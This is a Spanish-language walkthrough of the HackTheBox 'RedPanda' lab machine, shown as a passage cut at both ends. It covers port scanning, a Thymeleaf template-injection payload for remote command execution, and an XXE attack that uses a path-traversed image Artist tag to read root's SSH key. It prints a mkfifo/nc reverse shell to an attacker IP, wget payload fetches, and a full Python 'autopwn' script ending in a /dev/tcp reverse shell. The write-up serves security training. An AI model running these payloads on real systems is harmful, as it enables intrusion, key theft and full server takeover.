16:42:14 -0500", "snippet": "Overview Remote code excution by Server Site Template Injection (SSTI) (Foothold) Read files privileged by Xml External Entity Attack (XXE) (Privilege Escalation) OS IP Release Date Difficulty Points Linux 10.10.11.170 09 Jul 2022 Easy 20 Antes de empezar verificamos que estamos conectado a la VPN de HTB y tenemos conexión con la máquina:&amp;gt; ping -c1 10.10.11.170PING 10.10.11.170 (10.10.11.170) 56(84) bytes of data.64 bytes from 10.10.11.170: icmp_seq=1 ttl=63 time=106 ms \\______________________ Linux Machine--- 10.10.11.170 ping statistics ---1 packets transmitted, 1 received, 0% packet loss, time 0ms \\_________________\\____________________________________ Successful connectionrtt min/avg/max/mdev = 105.655/105.655/105.655/0.000 ms Explicación de parámetros: -c &amp;lt;count&amp;gt; : Número de paquetes ICMP que deseamos enviar a la máquinaEnumerationEmpezamos con la fase de reconocimiento haciendo un escaneo de tipo TCP (Transfer Control Protocol) para descubrir los puertos abiertos de la máquina:❯ nmap -p- --open -sS --min-rate 5000 -n -Pn 10.10.11.170Starting Nmap 7.92 ( https://nmap.org ) at 2022-09-22 16:57 -05Nmap scan report for 10.10.11.170Host is up (0.13s latency).Not shown: 65431 closed tcp ports (reset), 102 filtered tcp ports (no-response)Some closed ports may be reported as filtered due to --defeat-rst-ratelimitPORT STATE SERVICE22/tcp open ssh \\_________________ Secure Shell Protocol8080/tcp open http-proxy \\_________________ Hypertext Transfer Protocol (proxy) Explicación de parámetros : -p- : Escanear todos los puertos, del 1 al 65,535 –open : Escanear solo puertos abiertos -sS : Solo enviar paquetes de tipo SYN (inicio de conexión), incrementa velocidad del escaneo --min-rate &amp;lt;number&amp;gt; : Enviar una taza (&amp;lt;number&amp;gt;) de paquetes por segundo como mínimo -n : No buscar nombres de dominio asociadas a la IP en cuestión (rDNS) -Pn : Omitir el descubrimiento de hosts y continuar con el escaneo de puertos, incrementa velocidad del escaneoAhora realizamos un escaneo mas profundo para encontrar que servicios corren por cada uno de los puertos descubiertos 22(SSH) - 8080(HTTP-PROXY):❯ nmap -p22,8080 -sCV -oN openPortsTCP 10.10.11.170Starting Nmap 7.92 ( https://nmap.org ) at 2022-09-22 17:13 -05Nmap scan report for 10.10.11.170Host is up (0.11s latency).PORT STATE SERVICE VERSION22/tcp open ssh OpenSSH 8.2p1 Ubuntu 4ubuntu0.5 (Ubuntu Linux; protocol 2.0)| ssh-hostkey:| 3072 48:ad:d5:b8:3a:9f:bc:be:f7:e8:20:1e:f6:bf:de:ae (RSA)| 256 b7:89:6c:0b:20:ed:49:b2:c1:86:7c:29:92:74:1c:1f (ECDSA)|_ 256 18:cd:9d:08:a6:21:a8:b8:b6:f7:9f:8d:40:51:54:fb (ED25519)8080/tcp open http-proxy|_http-title: Red Panda Search | Made with Spring Boot| fingerprint-strings:| GetRequest:| HTTP/1.1 200| Content-Type: text/html;charset=UTF-8| Content-Language: en-US| Date: Thu, 22 Sep 2022 22:09:21 GMT| Connection: close| &amp;lt;!DOCTYPE html&amp;gt;| &amp;lt;html lang=&quot;en&quot; dir=&quot;ltr&quot;&amp;gt;| &amp;lt;head&amp;gt;| &amp;lt;meta charset=&quot;utf-8&quot;&amp;gt;| &amp;lt;meta author=&quot;wooden_k&quot;&amp;gt;| &amp;lt;!--Codepen by khr2003: https://codepen.io/khr2003/pen/BGZdXw --&amp;gt;| &amp;lt;link rel=&quot;stylesheet&quot; href=&quot;css/panda.css&quot; type=&quot;text/css&quot;&amp;gt;| &amp;lt;link rel=&quot;stylesheet&quot; href=&quot;css/main.css&quot; type=&quot;text/css&quot;&amp;gt;| &amp;lt;title&amp;gt;Red Panda Search | Made with Spring Boot&amp;lt;/title&amp;gt;| &amp;lt;/head&amp;gt;| &amp;lt;body&amp;gt;| &amp;lt;div class=&#39;pande&#39;&amp;gt;| &amp;lt;div class=&#39;ear left&#39;&amp;gt;&amp;lt;/div&amp;gt;| &amp;lt;div class=&#39;ear right&#39;&amp;gt;&amp;lt;/div&amp;gt;| &amp;lt;div class=&#39;whiskers left&#39;&amp;gt;| &amp;lt;span&amp;gt;&amp;lt;/span&amp;gt;| &amp;lt;span&amp;gt;&amp;lt;/span&amp;gt;| &amp;lt;span&amp;gt;&amp;lt;/span&amp;gt;| &amp;lt;/div&amp;gt;| &amp;lt;div class=&#39;whiskers right&#39;&amp;gt;| &amp;lt;span&amp;gt;&amp;lt;/span&amp;gt;| &amp;lt;span&amp;gt;&amp;lt;/span&amp;gt;| &amp;lt;span&amp;gt;&amp;lt;/span&amp;gt;| &amp;lt;/div&amp;gt;| &amp;lt;div class=&#39;face&#39;&amp;gt;| &amp;lt;div class=&#39;eye| HTTPOptions:| HTTP/1.1 200| Allow: GET,HEAD,OPTIONS| Content-Length: 0| Date: Thu, 22 Sep 2022 22:09:21 GMT| Connection: close| RTSPRequest:| HTTP/1.1 400| Content-Type: text/html;charset=utf-8| Content-Language: en| Content-Length: 435| Date: Thu, 22 Sep 2022 22:09:21 GMT| Connection: close| &amp;lt;!doctype html&amp;gt;&amp;lt;html lang=&quot;en&quot;&amp;gt;&amp;lt;head&amp;gt;&amp;lt;title&amp;gt;HTTP Status 400| Request&amp;lt;/title&amp;gt;&amp;lt;style type=&quot;text/css&quot;&amp;gt;body {font-family:Tahoma,Arial,sans-serif;} h1, h2, h3, b {color:white;background-color:#525D76;} h1 {font-size:22px;} h2 {font-size:16px;} h3 {font-size:14px;} p {font-size:12px;} a {color:black;} .line {height:1px;background-color:#525D76;border:none;}&amp;lt;/style&amp;gt;&amp;lt;/head&amp;gt;&amp;lt;body&amp;gt;&amp;lt;h1&amp;gt;HTTP Status 400. . .-Service Info: OS: Linux; CPE: cpe:/o:linux:linux_kernel Explicación de parámetros : -p &amp;lt;port_1,port_2,...&amp;gt; : Indicamos que puertos queremos escanear -sCV (Fusión de parámetros -sC -sV) -sC : Ejecutar en los puertos scripts por defecto de nmap -sV : Activar detección de versiones de los servicios que corren por los puertos -oN &amp;lt;file&amp;gt; : Guardar el output del escaneo en un archivo con formato NmapYa que no disponemos de credenciales omitimos analizar el puerto 22(SSH) y emepzamos con el reconocimiento en el servicio web 8080(HTTP-PROXY). Para ello emepzamos escaneando que tecnologías usa el servicio web: Usando whatweb❯ whatweb http://10.10.11.170:8080http://10.10.11.170:8080 [200 OK] Content-Language[en-US], Country[RESERVED][ZZ], HTML5, IP[10.10.11.170], Title[Red Panda Search | Made with Spring Boot] Si prefieres una herramienta con interfaz mas amigable puedes usar la extensión WappalyzerTanto como en los script de reconocimiento de nmap y el escaner de tecnologías Wappalyzer, la única información que tenemos es que estamos frente a un proxy web y se está usando el framework Spring Boot por la etiqueta &amp;lt;tittle&amp;gt;: ¿ Qué es un proxy ? Un proxy es un intermediario entre las conexiones del cliente (nosotros) y un servidor de desino (servicio web), donde se filtran los paquetes de las conexiones y con ello proporciona mayor seguridad ya que se establece una comunicación de manera indirecta ¿ Qué es Spring Boot ? Spring Boot es una herramienta que nos permite crear un proyecto como Spring (Framework del lenguaje Java), solo que Spring Boot elimina ciertas configuraciones repetitivas requeridas para desplegar la aplicación o proyectoCon estos conceptos mas claros nos dirigimos a examinar la interfaz del sitio web 8080(HTTP-PROXY): Usando ChromiumObservamos un buscador de pandas rojos que al testear y no disponer un texto al buscador nos aparece un panda por defecto:Nos menciona una pista de posible vector de ataque como son las Inyecciones de ataque (Injection attacks), como SQL Inyection (SQLi), Cross-Site Scripting (XSS), Code Injection, Command Injection, etc.Además, ya que el servidor está haciendo uso del Framework Spring Boot, sabemos que esto conlleva el uso de un Motor de plantilla (Template Engine)Entonces juntando ambas ideas se nos ocurre el vector de ataque Server Site Template Injection. Para ello, primero debemos validar que es vulnerable, luego buscar la manera de encontrar el motor de plantilla que corre por detrás y posteriormente ya podremos explotar la vulnerabilidad Tenemos la siguiente información: Framework : Spring Boot Lenguaje : Java Motor de plantila : ? ( posibles -&amp;gt; Java Server Pages, Thymeleaf, Groovy, FreeMarker, Jade) FootholdComo la única información certera que tenemos es que el framework usa el lenguaje Java, entonces procedemos a buscar tipos de inyecciones básicas del lenguaje: Repositorio PayloadsAllTheThingsAl validar la inyección nos sale el siguiente mensaje:Entonces comprobamos que no podemos escribir el simbolo $, por ello usamos otra expresión para variables como #, *, @, ~. Al final nos funciona los simbolos #, *, @ Ahora podemos intentar inyectar un comando para extraer archivos:Al intentar el segundo commando con la expresión * obtuvimos el archivo /etc/passwd, comprobando así que es vulnerable a Server Site Template InyectionLa respuesta de porque solo funciona con la expresión * es lo siguiente:Entonces ya podemos tener una idea que el motor de plantilla que se usa es Thymeleaf, mas adelante lo comprobaremos al 100% Puedes encontrar el repositorio para SSTI en PayloadsAllTheThings Analizando la inyección*{T(org.apache.commons.io.IOUtils).toString(T(java.lang.Runtime).getRuntime().exec(T(java.lang.Character).toString(99).concat(T(java.lang.Character).toString(97)).concat(T(java.lang.Character).toString(116)).concat(T(java.lang.Character).toString(32)).concat(T(java.lang.Character).toString(47)).concat(T(java.lang.Character).toString(101)).concat(T(java.lang.Character).toString(116)).concat(T(java.lang.Character).toString(99)).concat(T(java.lang.Character).toString(47)).concat(T(java.lang.Character).toString(112)).concat(T(java.lang.Character).toString(97)).concat(T(java.lang.Character).toString(115)).concat(T(java.lang.Character).toString(115)).concat(T(java.lang.Character).toString(119)).concat(T(java.lang.Character).toString(100))).getInputStream())}De primeras, por el tamaño, podemos concluir que para cada letra del comando que queremos ejecutar se está usando una conversión de su valor númerico y finalmente juntarlos todos. Aquí hay un poco de que sirve cada expresiónSSTI Payload:------------org.apache.commons.io (package) [Provides file and string comparison] IOUtils (class) [Provides utility methods for reading, writing and copying files] toString() (feature) [Read data from stream]java.lang (package) [Provides classes that are fundamental to the design of the Java programming language] Runtime (class) [Used to interact with Every Java application and allows the application to interface with the environment in which the application is running] getRuntime() (method) [Returns the runtime object associated with the current Java application] exec(String command) (method) [Executes the specified string command in a separate process] Character (class) [The Character class wraps a value of the primitive type char in an object] toString(char c) (method) [Returns a String object representing the specified char] concat(String concatenation) (method) [Forms a new String that is the combination of multiple strings] Process (class) [Provides methods for performing input from the process, performing output to the process, waiting, etc] getInputStream() (method) [Gets the input stream of the subprocess]# https://commons.apache.org/proper/commons-io/javadocs/api-2.4/org/apache/commons/io/package-use.html# https://docs.oracle.com/javase/8/docs/api/java/lang/package-summary.html Es importante saber que estas ejecutando, no lo olvidenCon la misma mecánica hice un script en python para una Ejecución remota de comandos:import requests # pip3 install requestsimport signalimport sys# pip3 install BeautifulSoup4 &amp;amp;&amp;amp; pip3 install lxmlfrom bs4 import BeautifulSoup# ctrl + cdef signal_handler(signum, frame): sys.exit(&#39;\\n[!] Interrupted.&#39;)signal.signal(signal.SIGINT, signal_handler)# help paneldef help(): print(f&#39;\\n[*] Use: python3 {sys.argv[0]} &amp;lt;command&amp;gt;&#39;) sys.exit()# valid inputif len(sys.argv) != 2: help()# variablestarget = &#39;http://10.10.11.170:8080/search&#39;command = sys.argv[1]# create payload (SSTI java)def create_inyection(cmd): cmd_convertion = &#39;&#39; pos = 0 for character in cmd: ascii_character = ord(character) # 97 = ord(&#39;a&#39;) java_convertion = f&#39;T(java.lang.Character).toString({ascii_character})&#39; # convertion by position (brackets) if pos == 0: cmd_convertion += java_convertion + &#39;.concat(&#39; elif pos &amp;lt; len(cmd) - 1: cmd_convertion += (java_convertion + &#39;).concat(&#39;) else: cmd_convertion += (java_convertion + &#39;)&#39;) pos += 1 payload = &#39;*{T(org.apache.commons.io.IOUtils).toString(T(java.lang.Runtime).getRuntime().exec(%s).getInputStream())}&#39; % cmd_convertion return payload# make post requestdef make_request(): try: session = requests.Session() headers = {&#39;Content-Type&#39; : &#39;application/x-www-form-urlencoded&#39;} post_data = &#39;name=&#39; + create_inyection(command) response = session.post(target, headers=headers, data=post_data) b_response = BeautifulSoup(response.text, &#39;lxml&#39;) output = b_response.find(class_=&#39;searched&#39;) print() print(output.string.replace(&#39;You searched for: &#39;, &#39;&#39;)) except Exception as e: sys.exit(f&#39;[x] {e}&#39;)if __name__ == &#39;__main__&#39;: make_request() Puedes encontrar el script en mi repositorio https://github.com/E1P0TR0Ahora solo pasamos un archivo con una reverse shell, luego la ejecutamos, recibiremos la shell del usuario woodenk y conseguimos la flag:❯ cat rce.sh───────┬───────────────────────────────────────────────────────────────────────────────── │ File: rce.sh───────┼───────────────────────────────────────────────────────────────────────────────── 1 │ #!/bin/sh 2 │ 3 │ rm /tmp/f;mkfifo /tmp/f;cat /tmp/f|/bin/sh -i 2&amp;gt;&amp;amp;1|nc 10.10.14.88 1234 &amp;gt;/tmp/f───────┴─────────────────────────────────────────────────────────────────────────────────❯ python3 -m http.server 80Serving HTTP on 0.0.0.0 port 80 (http://0.0.0.0:80/) ...10.10.11.170 - - [22/Sep/2022 19:21:12] &quot;GET /rce.sh HTTP/1.1&quot; 200 -─────────────────────────────────────────────────────────────────────────────────────────❯ python3 ssti_rce.py[*] Use: python3 ssti_rce.py &amp;lt;command&amp;gt;❯ python3 ssti_rce.py &#39;wget http://10.10.14.88/rce.sh&#39;❯ python3 ssti_rce.py &#39;bash rce.sh&#39;─────────────────────────────────────────────────────────────────────────────────────────❯ nc -lvnp 1234Ncat: Version 7.92 ( https://nmap.org/ncat )Ncat: Listening on :::1234Ncat: Listening on 0.0.0.0:1234Ncat: Connection from 10.10.11.170.Ncat: Connection from 10.10.11.170:36570./bin/sh: 0: can&#39;t access tty; job control turned off$ find / -name user.txt 2&amp;gt;/dev/null | xargs ls -l-rw-r----- 1 root woodenk 33 Sep 22 04:50 /home/woodenk/user.txt Puedes preguntarte por que no solo extraímos la llave privada y nos conectamos por SSH, la respuesta la veremos mas adelante…Ya que tenemos acceso al servidor, a continuación validamos las malas prácticas que nos proporcionaron explotar las vulnerabilidades anteriores: SSTI (file:/opt/panda_search/src/main/java/com/panda_search/htb/panda_search/MainController.java)...public String filter(String arg) { String[] no_no_words = {&quot;%&quot;, &quot;_&quot;,&quot;$&quot;, &quot;~&quot;, }; for (String word : no_no_words) { if(arg.contains(word)){ return &quot;Error occured: banned characters&quot;; } } return arg; }...También confirmamos motor de plantilla THymeleaf (file:/opt/panda_search/pom.xml)... &amp;lt;groupId&amp;gt;org.springframework.boot&amp;lt;/groupId&amp;gt; &amp;lt;artifactId&amp;gt;spring-boot-starter-thymeleaf&amp;lt;/artifactId&amp;gt;... Conceptos: pom.xml (Project Object Model) contiene información sobre dependencias, configuraciones e información importante del proyecto en Maven Maven es una herramienta de software para la gestión y construcción de proyectos JavaPrivilege EscalationAntes de seguir no olvidar hacer un Tratamiento de la TTY para poder desplazarnos mejor por la consola. Luego hacemos un reconocimiento básico del sistema y empezamos a listar procesos del sistema sin permisos privilegiados, para ello usamos la herramienta pspy:woodenk@redpanda:/tmp/.privesc$ ./pspy64pspy - version: v1.2.0 - Commit SHA: 9c63e5d6c58f7bcdc235db663f5e3fe1c33b8855 ██▓███ ██████ ██▓███ ▓██ ██▓ ▓██░ ██▒▒██ ▒ ▓██░ ██▒▒██ ██▒ ▓██░ ██▓▒░ ▓██▄ ▓██░ ██▓▒ ▒██ ██░ ▒██▄█▓▒ ▒ ▒ ██▒▒██▄█▓▒ ▒ ░ ▐██▓░ ▒██▒ ░ ░▒██████▒▒▒██▒ ░ ░ ░ ██▒▓░ ▒▓▒░ ░ ░▒ ▒▓▒ ▒ ░▒▓▒░ ░ ░ ██▒▒▒ ░▒ ░ ░ ░▒ ░ ░░▒ ░ ▓██ ░▒░ ░░ ░ ░ ░ ░░ ▒ ▒ ░░ ░ ░ ░ ░ ░Config: Printing events (colored=true): processes=true | file-system-events=false ||| Scannning for processes every 100ms and on inotify events ||| Watching directories: [/usr /tmp /etc /home /var /opt] (recursive) | [] (non-recursive)Draining file system events due to startup...done...2022/09/23 01:00:44 CMD: UID=0 PID=875 | sshd: /usr/sbin/sshd -D [listener] 0 of 10-100 startups2022/09/23 01:00:44 CMD: UID=0 PID=865 | /usr/sbin/atd -f2022/09/23 01:00:44 CMD: UID=0 PID=864 | sudo -u woodenk -g logs java -jar /opt/panda_search/target/panda_search-0.0.1-SNAPSHOT.jar2022/09/23 01:00:44 CMD: UID=0 PID=863 | /bin/sh -c sudo -u woodenk -g logs java -jar /opt/panda_search/target/panda_search-0.0.1-SNAPSHOT.jar [1]...2022/09/23 01:02:01 CMD: UID=0 PID=42084 | /bin/sh -c /root/run_credits.sh2022/09/23 01:02:01 CMD: UID=0 PID=42083 | /usr/sbin/CRON -f2022/09/23 01:02:01 CMD: UID=0 PID=42085 | /bin/sh /root/run_credits.sh2022/09/23 01:02:01 CMD: UID=0 PID=42086 | java -jar /opt/credit-score/LogParser/final/target/final-1.0-jar-with-dependencies.jar [2]... Puedes descargar la herramienta en su repositorio https://github.com/DominicBreuker/pspy[1] Primero observamos que se ejecuta el archivo .jar /opt/panda_search/target/panda_search-0.0.1-SNAPSHOT.jar, que como indica su nombre, es la aplicación panda_search, que es la web en sí. Y como vemos en el comando, lo ejecuta como el usuario woodenk y los permisos logs, permitiendonos así tener esos privilegios ya que nosotros aplicamos la Ejecución Remota de comandos por la web[2] Por otro lado, vemos que el usuario root ejecuta otra aplicación en Java, lo cuál puede ser interesanteLo primero que hacemos es trernos el archivo para examinarlo un poco, y al descomprimirlo encontramos el siguiente archivo:❯ ls com  META-INF  org  final-1.0-jar-with-dependencies.jar❯ cat META-INF/MANIFEST.MF───────┬────────────────────────────────────────────────────────── │ File: META-INF/MANIFEST.MF───────┼────────────────────────────────────────────────────────── 1 │ Manifest-Version: 1.0 2 │ Archiver-Version: Plexus Archiver 3 │ Created-By: Apache Maven 4 │ Built-By: root 5 │ Build-Jdk: 11.0.15 6 │ Main-Class: com.logparser.App 7 │ ───────┴──────────────────────────────────────────────────────────El archivo MANIFEST.MF contiene los metadatos del grupo de archivos que forman parte del programa (.jar). Y como menciona en el campo Main-Class, sabemos que la clase principal es com.logparser.App. Entonces volvemos a la máquina víctima y lo encontramos:package com.logparser;import java.io.BufferedWriter;import java.io.File;import java.io.FileWriter;import java.io.IOException;import java.util.HashMap;import java.util.Map;import java.util.Scanner;import com.drew.imaging.jpeg.JpegMetadataReader;import com.drew.imaging.jpeg.JpegProcessingException;import com.drew.metadata.Directory;import com.drew.metadata.Metadata;import com.drew.metadata.Tag;import org.jdom2.JDOMException;import org.jdom2.input.SAXBuilder;import org.jdom2.output.Format;import org.jdom2.output.XMLOutputter;import org.jdom2.*;public class App { public static Map parseLog(String line) { String[] strings = line.split(&quot;\\\\|\\\\|&quot;); Map map = new HashMap&amp;lt;&amp;gt;(); map.put(&quot;status_code&quot;, Integer.parseInt(strings[0])); map.put(&quot;ip&quot;, strings[1]); map.put(&quot;user_agent&quot;, strings[2]); map.put(&quot;uri&quot;, strings[3]); return map; } public static boolean isImage(String filename){ if(filename.contains(&quot;.jpg&quot;)) { return true; } return false; } public static String getArtist(String uri) throws IOException, JpegProcessingException { String fullpath = &quot;/opt/panda_search/src/main/resources/static&quot; + uri; File jpgFile = new File(fullpath); Metadata metadata = JpegMetadataReader.readMetadata(jpgFile); for(Directory dir : metadata.getDirectories()) { for(Tag tag : dir.getTags()) { if(tag.getTagName() == &quot;Artist&quot;) { return tag.getDescription(); } } } return &quot;N/A&quot;; } public static void addViewTo(String path, String uri) throws JDOMException, IOException { SAXBuilder saxBuilder = new SAXBuilder(); XMLOutputter xmlOutput = new XMLOutputter(); xmlOutput.setFormat(Format.getPrettyFormat()); File fd = new File(path); Document doc = saxBuilder.build(fd); Element rootElement = doc.getRootElement(); for(Element el: rootElement.getChildren()) { if(el.getName() == &quot;image&quot;) { if(el.getChild(&quot;uri&quot;).getText().equals(uri)) { Integer totalviews = Integer.parseInt(rootElement.getChild(&quot;totalviews&quot;).getText()) + 1; System.out.println(&quot;Total views:&quot; + Integer.toString(totalviews)); rootElement.getChild(&quot;totalviews&quot;).setText(Integer.toString(totalviews)); Integer views = Integer.parseInt(el.getChild(&quot;views&quot;).getText()); el.getChild(&quot;views&quot;).setText(Integer.toString(views + 1)); } } } BufferedWriter writer = new BufferedWriter(new FileWriter(fd)); xmlOutput.output(doc, writer); } public static void main(String[] args) throws JDOMException, IOException, JpegProcessingException { File log_fd = new File(&quot;/opt/panda_search/redpanda.log&quot;); Scanner log_reader = new Scanner(log_fd); while(log_reader.hasNextLine()) { String line = log_reader.nextLine(); if(!isImage(line)) { continue; } Map parsed_data = parseLog(line); System.out.println(parsed_data.get(&quot;uri&quot;)); String artist = getArtist(parsed_data.get(&quot;uri&quot;).toString()); System.out.println(&quot;Artist: &quot; + artist); String xmlPath = &quot;/credits/&quot; + artist + &quot;_creds.xml&quot;; addViewTo(xmlPath, parsed_data.get(&quot;uri&quot;).toString()); } }}Analizando el archivo, comprendemos que es el encargado de registrar y mostrar la tabla de créditos que recibe cada usuario al momento de ver una imagen: En la webTambién vemos que para mostrar la tabla con las vistas se lee la data de un archivo .xml. Esto ya es interesante y luego de un mayor análisis llegamos a la conclusión que es vulnerable a XML External Entity (XXE)La explicación es la siguiente: Por cada petición a la web, se guarda la data en un archivo log. (/opt/panda_search/redpanda.log) Si lo registrado (log) contiene un .jpg se extrae el campo URI que es la ruta del archivo. (code||ip||agent||URI) Luego se extrae de su metadata el nombre del artista dueño de la imagen. (/opt/panda_search/src/main/resources/static + URI) Esa información se usa para buscar en una ruta específica el archivo .xml con los datos de las vistas del artista (/credits/ + artist + _creds.xml) Por último, se procesa ese archivo .xml añadiendo la nueva data para luego mostrarla en la webExplotación: Nuestro objetivo es que se procese el archivo .xml que creemos el cuál contendrá el ataque XXE que nos permitirá leer archivos del sistemaComo vemos en el paso 2, primero descargamos una imagen .jpg cualquiera y le ponemos el nombre pwned.jpg para que sea válidaComo observamos en al paso 4, el campo artist es el encargado de seleccionar el archivo .xml, entonces podemos hacer que el campo artist realize Path Traversal ya que como observamos solo existe una concatenación y no es sanitizado❯ exiftool -Artist=../tmp/.privesc/pwned pwned.jpg 1 image files updatedAhora del paso 5, debemos crear nuestro archivo .xml teniendo en cuenta que tengamos como nombre la metadata artist y la concatenación con _creds.xml: Nombre : pwned_creds.xml&amp;lt;?xml version=&quot;1.0&quot; encoding=&quot;UTF-8&quot;?&amp;gt;&amp;lt;!DOCTYPE foo [ &amp;lt;!ENTITY xxe SYSTEM &quot;file:///root/.ssh/id_rsa&quot;&amp;gt; ]&amp;gt; &amp;lt;-- Root private key!&amp;lt;credits&amp;gt; &amp;lt;author&amp;gt;pwned&amp;lt;/author&amp;gt; &amp;lt;image&amp;gt; &amp;lt;uri&amp;gt;/img/greg.jpg&amp;lt;/uri&amp;gt; &amp;lt;views&amp;gt;6&amp;lt;/views&amp;gt; &amp;lt;/image&amp;gt; &amp;lt;xxe&amp;gt; &amp;amp;xxe; &amp;lt;/xxe&amp;gt; &amp;lt;totalviews&amp;gt;12&amp;lt;/totalviews&amp;gt;&amp;lt;/credits&amp;gt;Ahora debemos subir ambos archivos pwned.jpg pwned_creds.xml a nuestro directorio de trabajo /tmp/.privescPor último, como el paso 2 y 3, creamos un log con el correcto formato y que otra vez realize Path Traversal a nuestro archivo .jpg Nombre : redpanda.log (importante que el código sea 200 para que lo registre como petición exitosa)200||ip||user_agent||/../../../../../../tmp/.privesc/pwned.jpg Tengamos en cuenta que podemos modificar el archivo /opt/panda_search/redpanda.log gracias a que somos parte del grupo logsAhora solo remplazamos este log por el original, esperamos unos minutos a que se procese y al visualizar nuestro archivo pwned_creds.xml veremos la llave del usuario rootPara automatizar el proceso hice un autopwn en python que realiza todo lo mencionado anteriormente para obtener una shell como root:import argparseimport requests # pip3 install requestsimport shleximport signalimport subprocessimport sysimport timefrom bs4 import BeautifulSoup # pip3 install BeautifulSoup4from pwn import * # pip3 install pwntools# Autopwn Redpanda HTB machine# ----------------------------# author : Marss# date : Sep 21, 2022# ctrl + cdef signal_handler(signum, frame): sys.exit(&#39;\\n[!] Interrupted.&#39;)signal.signal(signal.SIGINT, signal_handler)# global variablesredpanda_ip = &#39;10.10.11.170&#39;pwned_jpg = &#39;pwned.jpg&#39;pwned_xml = &#39;pwned_creds.xml&#39;pwned_log = &#39;redpanda.log&#39;share_server = &#39;share_server.sh&#39;workstation = &#39;/tmp/.privesc&#39;# create SSTI inyectiondef create_inyection(command): command_convertion = &#39;&#39; position = 0 for character in command: character_value = ord(character) # 97 = ord(&#39;a&#39;) java_convertion = f&#39;T(java.lang.Character).toString({character_value})&#39; # convertion by position (brackets) if position == 0: command_convertion += java_convertion + &#39;.concat(&#39; elif position &amp;lt; len(command) - 1: command_convertion += (java_convertion + &#39;).concat(&#39;) else: command_convertion += (java_convertion + &#39;)&#39;) position += 1 payload = &#39;*{T(org.apache.commons.io.IOUtils).toString(T(java.lang.Runtime).getRuntime().exec(%s).getInputStream())}&#39; % command_convertion return payload# return SSTI inyectiondef get_inyection(command): return create_inyection(command)# make post requestdef make_request(payload): try: # create session session = requests.Session() headers = {&#39;Content-Type&#39; : &#39;application/x-www-form-urlencoded&#39;} post_data = &#39;name=&#39; + get_inyection(payload) session.post(f&#39;http://{redpanda_ip}:8080/search&#39;, headers=headers, data=post_data) except Exception as e: sys.exit(f&#39;\\n[x] {e}&#39;)# execute remote commanddef run_redpanda_command(name, inyection): command = inyection[name] make_request(command)# execute local commanddef run_local_command(command): process = subprocess.Popen(shlex.split(command), stdout=subprocess.DEVNULL, stderr=subprocess.DEVNULL) return process# upload .xml, .jpg and log filedef upload_files(args, progress): # inyection commands inyection = { &#39;workstation created&#39; : f&#39;mkdir -p {workstation}&#39;, &#39;.jpg uploaded&#39; : f&#39;wget http://{args.ip}:{args.port}/{pwned_jpg} -P {workstation}&#39;, &#39;.xml uploaded&#39; : f&#39;wget http://{args.ip}:{args.port}/{pwned_xml} -P {workstation}&#39;, &#39;logs uploaded&#39; : f&#39;wget http://{args.ip}:{args.port}/{pwned_log} -O /opt/panda_search/{pwned_log}&#39;, &#39;web server uploaded&#39; : f&#39;wget http://{args.ip}:{args.port}/{share_server} -P {workstation}&#39; } time.sleep(2) progress.status(f&#39;Opening web server by port {args.port} to share files&#39;) try: # share webserver server_process = run_local_command(f&#39;/usr/bin/python3 -m http.server {args.port}&#39;) # excute inyection commands (SSTI) for command in inyection: time.sleep(1); run_redpanda_command(command, inyection) log.info(command) # kill webserver process server_process.kill() time.sleep(2) log.success(&#39;Files uploaded.&#39;) except Exception as error: progress.failure(f&#39;{error} ocurred.&#39;)# wait for log file processingdef xxe_attack_processing(args, progress): time.sleep(2) progress.status(f&#39;Wait for XXE attack processing&#39;) for i in range(0, 130): time.sleep(1) progress.status(str(i) + &#39; (*/2 * * * * cron process)&#39;) log.success(&#39;Successful XXE attack.&#39;)# download .xml with processed data and extract keydef download_and_extract_key(args, progress, local_commands, remote_commands): time.sleep(2) progress.status(&#39;Downloading .xml file to extract id_rsa private key (root user)&#39;) # share webserver to local machine for specific time run_redpanda_command(&#39;share id_rsa_file&#39;, remote_commands) time.sleep(1) # wait to download id_rsa to redpanda machine run_local_command(local_commands[&#39;download id_rsa&#39;]) time.sleep(2) log.success(&#39;id_rsa_file downloaded&#39;) time.sleep(2) progress.status(&#39;Extracting private key&#39;) # extract id_rsa id_rsa_file = BeautifulSoup(open(&#39;id_rsa_file&#39;), features=&#39;xml&#39;) id_rsa_content = id_rsa_file.xxe.string + &#39;\\n&#39; # Important add &#39;\\n&#39;! with open(&#39;id_rsa_root&#39;, &#39;w&#39;) as file: file.write(id_rsa_content) # assign permisisons to id_rsa run_local_command(local_commands[&#39;assign permissions&#39;]) run_redpanda_command(&#39;kill server&#39;, remote_commands)# create reverse shell coonnectiondef reverse_shell(args, progress, local_command): time.sleep(1) progress.status(&#39;Starting reverse shell process&#39;) # listen mode to receive the shell time.sleep(1) print(f&#39;\\n[+] Open port {args.port} to receive shell. (e.g nc -lvnp {args.port})&#39;) input(&#39;Press to continue...&#39;) # execute reverse shell like root run_local_command(local_command)# exploit processdef run(args): progress = log.progress(&#39;Starting attack&#39;) # create workstation and upload files to XXE attack upload_files(args, progress) # wait for XXE file processing and extract to local machine xxe_attack_processing(args, progress) # remote and local commands redpanda_machine = { &#39;share id_rsa_file&#39; : f&#39;/bin/bash {workstation}/{share_server}&#39;, &#39;remove files&#39; : f&#39;/usr/bin/rm -r {workstation}&#39;, &#39;kill server&#39;: &#39;fuser -k 7777/tcp&#39; } local_machine = { &#39;download id_rsa&#39; : f&#39;/usr/bin/wget http://{redpanda_ip}:7777/{pwned_xml} -O id_rsa_file&#39;, &#39;assign permissions&#39; : &#39;/usr/bin/chmod 600 id_rsa_root&#39;, &#39;ssh reverse&#39; : f&#39;/usr/bin/ssh -q -i id_rsa_root root@{redpanda_ip} &quot;/bin/bash -c \\&#39;/bin/bash -i &amp;gt;&amp;amp; /dev/tcp/{args.ip}/{args.port} 0&amp;gt;&amp;amp;1\\&#39;&quot;&#39; } # download .xml and extract private key download_and_extract_key(args, progress, local_machine, redpanda_machine) # remove workstation and files on redpanda machine run_redpanda_command(&#39;remove files&#39;, redpanda_machine) # init reverse shell by SSH reverse_shell(args, progress, local_machine[&#39;ssh reverse&#39;])# main program flow and argument declarationif __name__ == &#39;__main__&#39;: parser = argparse.ArgumentParser( description=&#39;Autopwn Redpanda HTB machine&#39;, formatter_class=argparse.RawDescriptionHelpFormatter, epilog=&#39;&#39;&#39;Example: autopwn.py -i 10.10.10.10 -p 4444 &#39;&#39;&#39;) parser.add_argument(&#39;-i&#39;, &#39;--ip&#39;, required=True, help=&#39;specific IP to receive the shell&#39;) parser.add_argument(&#39;-p&#39;, &#39;--port&#39;, required=True, type=int, help=&#39;specific PORT to receive the shell&#39;) args = parser.parse_args() run(args)Ahora solo lo ejecutamos, esperamos el proceso, conseguimos la shell y la flag:❯ python3 autopwn.py -i 